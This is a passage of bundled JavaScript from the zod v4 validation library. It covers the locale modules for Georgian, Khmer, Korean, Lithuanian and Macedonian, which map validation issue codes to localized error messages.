        return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10DB\u10DC\u10D8\u10E8\u10D5\u10DC\u10D4\u10DA\u10DD\u10D1\u10D0 ${issue2.origin}-\u10E8\u10D8`;
      default:
        return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E8\u10D4\u10E7\u10D5\u10D0\u10DC\u10D0`;
    }
  };
};
function ka_default() {
  return {
    localeError: error23()
  };
}
// node_modules/zod/v4/locales/km.js
var error24 = () => {
  const Sizable = {
    string: { unit: "\u178F\u17BD\u17A2\u1780\u17D2\u179F\u179A", verb: "\u1782\u17BD\u179A\u1798\u17B6\u1793" },
    file: { unit: "\u1794\u17C3", verb: "\u1782\u17BD\u179A\u1798\u17B6\u1793" },
    array: { unit: "\u1792\u17B6\u178F\u17BB", verb: "\u1782\u17BD\u179A\u1798\u17B6\u1793" },
    set: { unit: "\u1792\u17B6\u178F\u17BB", verb: "\u1782\u17BD\u179A\u1798\u17B6\u1793" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1794\u1789\u17D2\u1785\u17BC\u179B",
    email: "\u17A2\u17B6\u179F\u1799\u178A\u17D2\u178B\u17B6\u1793\u17A2\u17CA\u17B8\u1798\u17C2\u179B",
    url: "URL",
    emoji: "\u179F\u1789\u17D2\u1789\u17B6\u17A2\u17B6\u179A\u1798\u17D2\u1798\u178E\u17CD",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u1780\u17B6\u179B\u1794\u179A\u17B7\u1785\u17D2\u1786\u17C1\u1791 \u1793\u17B7\u1784\u1798\u17C9\u17C4\u1784 ISO",
    date: "\u1780\u17B6\u179B\u1794\u179A\u17B7\u1785\u17D2\u1786\u17C1\u1791 ISO",
    time: "\u1798\u17C9\u17C4\u1784 ISO",
    duration: "\u179A\u1799\u17C8\u1796\u17C1\u179B ISO",
    ipv4: "\u17A2\u17B6\u179F\u1799\u178A\u17D2\u178B\u17B6\u1793 IPv4",
    ipv6: "\u17A2\u17B6\u179F\u1799\u178A\u17D2\u178B\u17B6\u1793 IPv6",
    cidrv4: "\u178A\u17C2\u1793\u17A2\u17B6\u179F\u1799\u178A\u17D2\u178B\u17B6\u1793 IPv4",
    cidrv6: "\u178A\u17C2\u1793\u17A2\u17B6\u179F\u1799\u178A\u17D2\u178B\u17B6\u1793 IPv6",
    base64: "\u1781\u17D2\u179F\u17C2\u17A2\u1780\u17D2\u179F\u179A\u17A2\u17CA\u17B7\u1780\u17BC\u178A base64",
    base64url: "\u1781\u17D2\u179F\u17C2\u17A2\u1780\u17D2\u179F\u179A\u17A2\u17CA\u17B7\u1780\u17BC\u178A base64url",
    json_string: "\u1781\u17D2\u179F\u17C2\u17A2\u1780\u17D2\u179F\u179A JSON",
    e164: "\u179B\u17C1\u1781 E.164",
    jwt: "JWT",
    template_literal: "\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1794\u1789\u17D2\u1785\u17BC\u179B"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u179B\u17C1\u1781",
    array: "\u17A2\u17B6\u179A\u17C1 (Array)",
    null: "\u1782\u17D2\u1798\u17B6\u1793\u178F\u1798\u17D2\u179B\u17C3 (null)"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1794\u1789\u17D2\u1785\u17BC\u179B\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1780\u17B6\u179A instanceof ${issue2.expected} \u1794\u17C9\u17BB\u1793\u17D2\u178F\u17C2\u1791\u1791\u17BD\u179B\u1794\u17B6\u1793 ${received}`;
        }
        return `\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1794\u1789\u17D2\u1785\u17BC\u179B\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1780\u17B6\u179A ${expected} \u1794\u17C9\u17BB\u1793\u17D2\u178F\u17C2\u1791\u1791\u17BD\u179B\u1794\u17B6\u1793 ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1794\u1789\u17D2\u1785\u17BC\u179B\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1780\u17B6\u179A ${stringifyPrimitive(issue2.values[0])}`;
        return `\u1787\u1798\u17D2\u179A\u17BE\u179F\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1787\u17B6\u1798\u17BD\u1799\u1780\u17D2\u1793\u17BB\u1784\u1785\u17C6\u178E\u17C4\u1798 ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\u1792\u17C6\u1796\u17C1\u1780\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1780\u17B6\u179A ${issue2.origin ?? "\u178F\u1798\u17D2\u179B\u17C3"} ${adj} ${issue2.maximum.toString()} ${sizing.unit ?? "\u1792\u17B6\u178F\u17BB"}`;
        return `\u1792\u17C6\u1796\u17C1\u1780\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1780\u17B6\u179A ${issue2.origin ?? "\u178F\u1798\u17D2\u179B\u17C3"} ${adj} ${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u178F\u17BC\u1785\u1796\u17C1\u1780\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1780\u17B6\u179A ${issue2.origin} ${adj} ${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `\u178F\u17BC\u1785\u1796\u17C1\u1780\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1780\u17B6\u179A ${issue2.origin} ${adj} ${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `\u1781\u17D2\u179F\u17C2\u17A2\u1780\u17D2\u179F\u179A\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1785\u17B6\u1794\u17CB\u1795\u17D2\u178F\u17BE\u1798\u178A\u17C4\u1799 "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `\u1781\u17D2\u179F\u17C2\u17A2\u1780\u17D2\u179F\u179A\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1794\u1789\u17D2\u1785\u1794\u17CB\u178A\u17C4\u1799 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u1781\u17D2\u179F\u17C2\u17A2\u1780\u17D2\u179F\u179A\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1798\u17B6\u1793 "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u1781\u17D2\u179F\u17C2\u17A2\u1780\u17D2\u179F\u179A\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u178F\u17C2\u1795\u17D2\u1782\u17BC\u1795\u17D2\u1782\u1784\u1793\u17B9\u1784\u1791\u1798\u17D2\u179A\u1784\u17CB\u178A\u17C2\u179B\u1794\u17B6\u1793\u1780\u17C6\u178E\u178F\u17CB ${_issue.pattern}`;
        return `\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\u179B\u17C1\u1781\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u178F\u17C2\u1787\u17B6\u1796\u17A0\u17BB\u1782\u17BB\u178E\u1793\u17C3 ${issue2.divisor}`;
      case "unrecognized_keys":
        return `\u179A\u1780\u1783\u17BE\u1789\u179F\u17C4\u1798\u17B7\u1793\u179F\u17D2\u1782\u17B6\u179B\u17CB\u17D6 ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `\u179F\u17C4\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u1793\u17C5\u1780\u17D2\u1793\u17BB\u1784 ${issue2.origin}`;
      case "invalid_union":
        return `\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C`;
      case "invalid_element":
        return `\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u1793\u17C5\u1780\u17D2\u1793\u17BB\u1784 ${issue2.origin}`;
      default:
        return `\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C`;
    }
  };
};
function km_default() {
  return {
    localeError: error24()
  };
}

// node_modules/zod/v4/locales/kh.js
function kh_default() {
  return km_default();
}
// node_modules/zod/v4/locales/ko.js
var error25 = () => {
  const Sizable = {
    string: { unit: "\uBB38\uC790", verb: "to have" },
    file: { unit: "\uBC14\uC774\uD2B8", verb: "to have" },
    array: { unit: "\uAC1C", verb: "to have" },
    set: { unit: "\uAC1C", verb: "to have" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\uC785\uB825",
    email: "\uC774\uBA54\uC77C \uC8FC\uC18C",
    url: "URL",
    emoji: "\uC774\uBAA8\uC9C0",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO \uB0A0\uC9DC\uC2DC\uAC04",
    date: "ISO \uB0A0\uC9DC",
    time: "ISO \uC2DC\uAC04",
    duration: "ISO \uAE30\uAC04",
    ipv4: "IPv4 \uC8FC\uC18C",
    ipv6: "IPv6 \uC8FC\uC18C",
    cidrv4: "IPv4 \uBC94\uC704",
    cidrv6: "IPv6 \uBC94\uC704",
    base64: "base64 \uC778\uCF54\uB529 \uBB38\uC790\uC5F4",
    base64url: "base64url \uC778\uCF54\uB529 \uBB38\uC790\uC5F4",
    json_string: "JSON \uBB38\uC790\uC5F4",
    e164: "E.164 \uBC88\uD638",
    jwt: "JWT",
    template_literal: "\uC785\uB825"
  };
  const TypeDictionary = {
    nan: "NaN"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\uC798\uBABB\uB41C \uC785\uB825: \uC608\uC0C1 \uD0C0\uC785\uC740 instanceof ${issue2.expected}, \uBC1B\uC740 \uD0C0\uC785\uC740 ${received}\uC785\uB2C8\uB2E4`;
        }
        return `\uC798\uBABB\uB41C \uC785\uB825: \uC608\uC0C1 \uD0C0\uC785\uC740 ${expected}, \uBC1B\uC740 \uD0C0\uC785\uC740 ${received}\uC785\uB2C8\uB2E4`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\uC798\uBABB\uB41C \uC785\uB825: \uAC12\uC740 ${stringifyPrimitive(issue2.values[0])} \uC774\uC5B4\uC57C \uD569\uB2C8\uB2E4`;
        return `\uC798\uBABB\uB41C \uC635\uC158: ${joinValues(issue2.values, "\uB610\uB294 ")} \uC911 \uD558\uB098\uC5EC\uC57C \uD569\uB2C8\uB2E4`;
      case "too_big": {
        const adj = issue2.inclusive ? "\uC774\uD558" : "\uBBF8\uB9CC";
        const suffix = adj === "\uBBF8\uB9CC" ? "\uC774\uC5B4\uC57C \uD569\uB2C8\uB2E4" : "\uC5EC\uC57C \uD569\uB2C8\uB2E4";
        const sizing = getSizing(issue2.origin);
        const unit = sizing?.unit ?? "\uC694\uC18C";
        if (sizing)
          return `${issue2.origin ?? "\uAC12"}\uC774 \uB108\uBB34 \uD07D\uB2C8\uB2E4: ${issue2.maximum.toString()}${unit} ${adj}${suffix}`;
        return `${issue2.origin ?? "\uAC12"}\uC774 \uB108\uBB34 \uD07D\uB2C8\uB2E4: ${issue2.maximum.toString()} ${adj}${suffix}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? "\uC774\uC0C1" : "\uCD08\uACFC";
        const suffix = adj === "\uC774\uC0C1" ? "\uC774\uC5B4\uC57C \uD569\uB2C8\uB2E4" : "\uC5EC\uC57C \uD569\uB2C8\uB2E4";
        const sizing = getSizing(issue2.origin);
        const unit = sizing?.unit ?? "\uC694\uC18C";
        if (sizing) {
          return `${issue2.origin ?? "\uAC12"}\uC774 \uB108\uBB34 \uC791\uC2B5\uB2C8\uB2E4: ${issue2.minimum.toString()}${unit} ${adj}${suffix}`;
        }
        return `${issue2.origin ?? "\uAC12"}\uC774 \uB108\uBB34 \uC791\uC2B5\uB2C8\uB2E4: ${issue2.minimum.toString()} ${adj}${suffix}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `\uC798\uBABB\uB41C \uBB38\uC790\uC5F4: "${_issue.prefix}"(\uC73C)\uB85C \uC2DC\uC791\uD574\uC57C \uD569\uB2C8\uB2E4`;
        }
        if (_issue.format === "ends_with")
          return `\uC798\uBABB\uB41C \uBB38\uC790\uC5F4: "${_issue.suffix}"(\uC73C)\uB85C \uB05D\uB098\uC57C \uD569\uB2C8\uB2E4`;
        if (_issue.format === "includes")
          return `\uC798\uBABB\uB41C \uBB38\uC790\uC5F4: "${_issue.includes}"\uC744(\uB97C) \uD3EC\uD568\uD574\uC57C \uD569\uB2C8\uB2E4`;
        if (_issue.format === "regex")
          return `\uC798\uBABB\uB41C \uBB38\uC790\uC5F4: \uC815\uADDC\uC2DD ${_issue.pattern} \uD328\uD134\uACFC \uC77C\uCE58\uD574\uC57C \uD569\uB2C8\uB2E4`;
        return `\uC798\uBABB\uB41C ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\uC798\uBABB\uB41C \uC22B\uC790: ${issue2.divisor}\uC758 \uBC30\uC218\uC5EC\uC57C \uD569\uB2C8\uB2E4`;
      case "unrecognized_keys":
        return `\uC778\uC2DD\uD560 \uC218 \uC5C6\uB294 \uD0A4: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `\uC798\uBABB\uB41C \uD0A4: ${issue2.origin}`;
      case "invalid_union":
        return `\uC798\uBABB\uB41C \uC785\uB825`;
      case "invalid_element":
        return `\uC798\uBABB\uB41C \uAC12: ${issue2.origin}`;
      default:
        return `\uC798\uBABB\uB41C \uC785\uB825`;
    }
  };
};
function ko_default() {
  return {
    localeError: error25()
  };
}
// node_modules/zod/v4/locales/lt.js
var capitalizeFirstCharacter = (text) => {
  return text.charAt(0).toUpperCase() + text.slice(1);
};
function getUnitTypeFromNumber(number2) {
  const abs = Math.abs(number2);
  const last = abs % 10;
  const last2 = abs % 100;
  if (last2 >= 11 && last2 <= 19 || last === 0)
    return "many";
  if (last === 1)
    return "one";
  return "few";
}
var error26 = () => {
  const Sizable = {
    string: {
      unit: {
        one: "simbolis",
        few: "simboliai",
        many: "simboli\u0173"
      },
      verb: {
        smaller: {
          inclusive: "turi b\u016Bti ne ilgesn\u0117 kaip",
          notInclusive: "turi b\u016Bti trumpesn\u0117 kaip"
        },
        bigger: {
          inclusive: "turi b\u016Bti ne trumpesn\u0117 kaip",
          notInclusive: "turi b\u016Bti ilgesn\u0117 kaip"
        }
      }
    },
    file: {
      unit: {
        one: "baitas",
        few: "baitai",
        many: "bait\u0173"
      },
      verb: {
        smaller: {
          inclusive: "turi b\u016Bti ne didesnis kaip",
          notInclusive: "turi b\u016Bti ma\u017Eesnis kaip"
        },
        bigger: {
          inclusive: "turi b\u016Bti ne ma\u017Eesnis kaip",
          notInclusive: "turi b\u016Bti didesnis kaip"
        }
      }
    },
    array: {
      unit: {
        one: "element\u0105",
        few: "elementus",
        many: "element\u0173"
      },
      verb: {
        smaller: {
          inclusive: "turi tur\u0117ti ne daugiau kaip",
          notInclusive: "turi tur\u0117ti ma\u017Eiau kaip"
        },
        bigger: {
          inclusive: "turi tur\u0117ti ne ma\u017Eiau kaip",
          notInclusive: "turi tur\u0117ti daugiau kaip"
        }
      }
    },
    set: {
      unit: {
        one: "element\u0105",
        few: "elementus",
        many: "element\u0173"
      },
      verb: {
        smaller: {
          inclusive: "turi tur\u0117ti ne daugiau kaip",
          notInclusive: "turi tur\u0117ti ma\u017Eiau kaip"
        },
        bigger: {
          inclusive: "turi tur\u0117ti ne ma\u017Eiau kaip",
          notInclusive: "turi tur\u0117ti daugiau kaip"
        }
      }
    }
  };
  function getSizing(origin, unitType, inclusive, targetShouldBe) {
    const result = Sizable[origin] ?? null;
    if (result === null)
      return result;
    return {
      unit: result.unit[unitType],
      verb: result.verb[targetShouldBe][inclusive ? "inclusive" : "notInclusive"]
    };
  }
  const FormatDictionary = {
    regex: "\u012Fvestis",
    email: "el. pa\u0161to adresas",
    url: "URL",
    emoji: "jaustukas",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO data ir laikas",
    date: "ISO data",
    time: "ISO laikas",
    duration: "ISO trukm\u0117",
    ipv4: "IPv4 adresas",
    ipv6: "IPv6 adresas",
    cidrv4: "IPv4 tinklo prefiksas (CIDR)",
    cidrv6: "IPv6 tinklo prefiksas (CIDR)",
    base64: "base64 u\u017Ekoduota eilut\u0117",
    base64url: "base64url u\u017Ekoduota eilut\u0117",
    json_string: "JSON eilut\u0117",
    e164: "E.164 numeris",
    jwt: "JWT",
    template_literal: "\u012Fvestis"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "skai\u010Dius",
    bigint: "sveikasis skai\u010Dius",
    string: "eilut\u0117",
    boolean: "login\u0117 reik\u0161m\u0117",
    undefined: "neapibr\u0117\u017Eta reik\u0161m\u0117",
    function: "funkcija",
    symbol: "simbolis",
    array: "masyvas",
    object: "objektas",
    null: "nulin\u0117 reik\u0161m\u0117"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Gautas tipas ${received}, o tik\u0117tasi - instanceof ${issue2.expected}`;
        }
        return `Gautas tipas ${received}, o tik\u0117tasi - ${expected}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Privalo b\u016Bti ${stringifyPrimitive(issue2.values[0])}`;
        return `Privalo b\u016Bti vienas i\u0161 ${joinValues(issue2.values, "|")} pasirinkim\u0173`;
      case "too_big": {
        const origin = TypeDictionary[issue2.origin] ?? issue2.origin;
        const sizing = getSizing(issue2.origin, getUnitTypeFromNumber(Number(issue2.maximum)), issue2.inclusive ?? false, "smaller");
        if (sizing?.verb)
          return `${capitalizeFirstCharacter(origin ?? issue2.origin ?? "reik\u0161m\u0117")} ${sizing.verb} ${issue2.maximum.toString()} ${sizing.unit ?? "element\u0173"}`;
        const adj = issue2.inclusive ? "ne didesnis kaip" : "ma\u017Eesnis kaip";
        return `${capitalizeFirstCharacter(origin ?? issue2.origin ?? "reik\u0161m\u0117")} turi b\u016Bti ${adj} ${issue2.maximum.toString()} ${sizing?.unit}`;
      }
      case "too_small": {
        const origin = TypeDictionary[issue2.origin] ?? issue2.origin;
        const sizing = getSizing(issue2.origin, getUnitTypeFromNumber(Number(issue2.minimum)), issue2.inclusive ?? false, "bigger");
        if (sizing?.verb)
          return `${capitalizeFirstCharacter(origin ?? issue2.origin ?? "reik\u0161m\u0117")} ${sizing.verb} ${issue2.minimum.toString()} ${sizing.unit ?? "element\u0173"}`;
        const adj = issue2.inclusive ? "ne ma\u017Eesnis kaip" : "didesnis kaip";
        return `${capitalizeFirstCharacter(origin ?? issue2.origin ?? "reik\u0161m\u0117")} turi b\u016Bti ${adj} ${issue2.minimum.toString()} ${sizing?.unit}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `Eilut\u0117 privalo prasid\u0117ti "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `Eilut\u0117 privalo pasibaigti "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Eilut\u0117 privalo \u012Ftraukti "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Eilut\u0117 privalo atitikti ${_issue.pattern}`;
        return `Neteisingas ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Skai\u010Dius privalo b\u016Bti ${issue2.divisor} kartotinis.`;
      case "unrecognized_keys":
        return `Neatpa\u017Eint${issue2.keys.length > 1 ? "i" : "as"} rakt${issue2.keys.length > 1 ? "ai" : "as"}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return "Rastas klaidingas raktas";
      case "invalid_union":
        return "Klaidinga \u012Fvestis";
      case "invalid_element": {
        const origin = TypeDictionary[issue2.origin] ?? issue2.origin;
        return `${capitalizeFirstCharacter(origin ?? issue2.origin ?? "reik\u0161m\u0117")} turi klaiding\u0105 \u012Fvest\u012F`;
      }
      default:
        return "Klaidinga \u012Fvestis";
    }
  };
};
function lt_default() {
  return {
    localeError: error26()
  };
}
// node_modules/zod/v4/locales/mk.js
var error27 = () => {
  const Sizable = {
    string: { unit: "\u0437\u043D\u0430\u0446\u0438", verb: "\u0434\u0430 \u0438\u043C\u0430\u0430\u0442" },
    file: { unit: "\u0431\u0430\u0458\u0442\u0438", verb: "\u0434\u0430 \u0438\u043C\u0430\u0430\u0442" },
    array: { unit: "\u0441\u0442\u0430\u0432\u043A\u0438", verb: "\u0434\u0430 \u0438\u043C\u0430\u0430\u0442" },
    set: { unit: "\u0441\u0442\u0430\u0432\u043A\u0438", verb: "\u0434\u0430 \u0438\u043C\u0430\u0430\u0442" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u0432\u043D\u0435\u0441",
    email: "\u0430\u0434\u0440\u0435\u0441\u0430 \u043D\u0430 \u0435-\u043F\u043E\u0448\u0442\u0430",
    url: "URL",
    emoji: "\u0435\u043C\u043E\u045F\u0438",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO \u0434\u0430\u0442\u0443\u043C \u0438 \u0432\u0440\u0435\u043C\u0435",
    date: "ISO \u0434\u0430\u0442\u0443\u043C",
    time: "ISO \u0432\u0440\u0435\u043C\u0435",
    duration: "ISO \u0432\u0440\u0435\u043C\u0435\u0442\u0440\u0430\u0435\u045A\u0435",
    ipv4: "IPv4 \u0430\u0434\u0440\u0435\u0441\u0430",
    ipv6: "IPv6 \u0430\u0434\u0440\u0435\u0441\u0430",
    cidrv4: "IPv4 \u043E\u043F\u0441\u0435\u0433",
    cidrv6: "IPv6 \u043E\u043F\u0441\u0435\u0433",
    base64: "base64-\u0435\u043D\u043A\u043E\u0434\u0438\u0440\u0430\u043D\u0430 \u043D\u0438\u0437\u0430",
    base64url: "base64url-\u0435\u043D\u043A\u043E\u0434\u0438\u0440\u0430\u043D\u0430 \u043D\u0438\u0437\u0430",
    json_string: "JSON \u043D\u0438\u0437\u0430",
    e164: "E.164 \u0431\u0440\u043E\u0458",
    jwt: "JWT",
    template_literal: "\u0432\u043D\u0435\u0441"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u0431\u0440\u043E\u0458",
    array: "\u043D\u0438\u0437\u0430"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u0413\u0440\u0435\u0448\u0435\u043D \u0432\u043D\u0435\u0441: \u0441\u0435 \u043E\u0447\u0435\u043A\u0443\u0432\u0430 instanceof ${issue2.expected}, \u043F\u0440\u0438\u043C\u0435\u043D\u043E ${received}`;
        }
        return `\u0413\u0440\u0435\u0448\u0435\u043D \u0432\u043D\u0435\u0441: \u0441\u0435 \u043E\u0447\u0435\u043A\u0443\u0432\u0430 ${expected}, \u043F\u0440\u0438\u043C\u0435\u043D\u043E ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Invalid input: expected ${stringifyPrimitive(issue2.values[0])}`;
        return `\u0413\u0440\u0435\u0448\u0430\u043D\u0430 \u043E\u043F\u0446\u0438\u0458\u0430: \u0441\u0435 \u043E\u0447\u0435\u043A\u0443\u0432\u0430 \u0435\u0434\u043D\u0430 ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\u041F\u0440\u0435\u043C\u043D\u043E\u0433\u0443 \u0433\u043E\u043B\u0435\u043C: \u0441\u0435 \u043E\u0447\u0435\u043A\u0443\u0432\u0430 ${issue2.origin ?? "\u0432\u0440\u0435\u0434\u043D\u043E\u0441\u0442\u0430"} \u0434\u0430 \u0438\u043C\u0430 ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "\u0435\u043B\u0435\u043C\u0435\u043D\u0442\u0438"}`;
        return `\u041F\u0440\u0435\u043C\u043D\u043E\u0433\u0443 \u0433\u043E\u043B\u0435\u043C: \u0441\u0435 \u043E\u0447\u0435\u043A\u0443\u0432\u0430 ${issue2.origin ?? "\u0432\u0440\u0435\u0434\u043D\u043E\u0441\u0442\u0430"} \u0434\u0430 \u0431\u0438\u0434\u0435 ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u041F\u0440\u0435\u043C\u043D\u043E\u0433\u0443 \u043C\u0430\u043B: \u0441\u0435 \u043E\u0447\u0435\u043A\u0443\u0432\u0430 ${issue2.origin} \u0434\u0430 \u0438\u043C\u0430 ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `\u041F\u0440\u0435\u043C\u043D\u043E\u0433\u0443 \u043C\u0430\u043B: \u0441\u0435 \u043E\u0447\u0435\u043A\u0443\u0432\u0430 ${issue2.origin} \u0434\u0430 \u0431\u0438\u0434\u0435 ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `\u041D\u0435\u0432\u0430\u0436\u0435\u0447\u043A\u0430 \u043D\u0438\u0437\u0430: \u043C\u043E\u0440\u0430 \u0434\u0430 \u0437\u0430\u043F\u043E\u0447\u043D\u0443\u0432\u0430 \u0441\u043E "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `\u041D\u0435\u0432\u0430\u0436\u0435\u0447\u043A\u0430 \u043D\u0438\u0437\u0430: \u043C\u043E\u0440\u0430 \u0434\u0430 \u0437\u0430\u0432\u0440\u0448\u0443\u0432\u0430 \u0441\u043E "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u041D\u0435\u0432\u0430\u0436\u0435\u0447\u043A\u0430 \u043D\u0438\u0437\u0430: \u043C\u043E\u0440\u0430 \u0434\u0430 \u0432\u043A\u043B\u0443\u0447\u0443\u0432\u0430 "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u041D\u0435\u0432\u0430\u0436\u0435\u0447\u043A\u0430 \u043D\u0438\u0437\u0430: \u043C\u043E\u0440\u0430 \u0434\u0430 \u043E\u0434\u0433\u043E\u0430\u0440\u0430 \u043D\u0430 \u043F\u0430\u0442\u0435\u0440\u043D\u043E\u0442 ${_issue.pattern}`;
